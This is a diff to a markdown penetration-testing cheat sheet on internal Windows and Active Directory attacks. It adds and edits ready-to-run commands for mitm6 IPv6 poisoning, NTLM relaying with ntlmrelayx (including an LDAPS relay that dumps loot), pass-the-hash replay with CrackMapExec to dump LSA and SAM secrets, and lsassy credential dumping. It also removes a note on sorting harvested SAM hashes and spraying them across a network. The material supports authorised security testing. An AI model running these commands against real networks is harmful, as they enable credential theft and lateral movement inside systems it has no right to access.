@@ -104,15 +104,14 @@ python Responder.py -I <interface> -rdw
 ntlmrelayx.py -tf relaylistOutputFilename.txt
 ```
 
-> This command will generate many log files which contain SAM hashes, just get all these files and store it into a formatted file that includes all hashes. \( `cat *.sam |sort -u > hashs.txt` \) Then you can just run CrackMapExec on full scope using theses hashes :
-
-`crackmapexec smb perim_up_smb.txt -u Administrator -d '.' -H hashs.txt --lsa`
-
 mitm6 + NTLMrelayx
 
 ```bash
 sudo mitm6 -hw icorp-w10 -d internal.corp --ignore-nofqnd
 ntlmrelayx.py -tf relaylistOutputFilename.txt -6 
+
+# If no smb available, try ldap : 
+ntlmrelayx.py -t ldaps://<DC> -l lootdir
 ```
 
 ARP \(use with caution !\)
@@ -148,7 +147,7 @@ Cain.exe (& Abel)
 
 ### Post-Exploitation
 
-> For more details, see next cheatsheet : [Local Privilege Escalation Windows](05-post-exploitation-windows.md)
+> For more details, see next cheatsheet : [Local Post Exploitation Windows](05-post-exploitation-windows.md)
 
 ### Pivoting
 
@@ -156,11 +155,12 @@ Cain.exe (& Abel)
 
 ### Replay the secrets found
 
-Kerberos ticket, LM/NTLM hash or cleartext password with CrackMapExec
+Kerberos ticket, LM/NTLM hash or cleartext password with CrackMapExec or lsassy
 
 ```bash
-crackmapexec smb <host_file> -u <user> -d <domain> -H <hash> --lsa
-crackmapexec smb <host_file> -u <user> -d <domain> -H <hash> --sam
+crackmapexec smb <host_file> -d <domain> -u <user>  -H <hash> --lsa
+crackmapexec smb <host_file> -d <domain> -u <user>  -H <hash> --sam
+lsassy <target> -d <domain> -u <user> -p <pass>
 ```
 
 ---
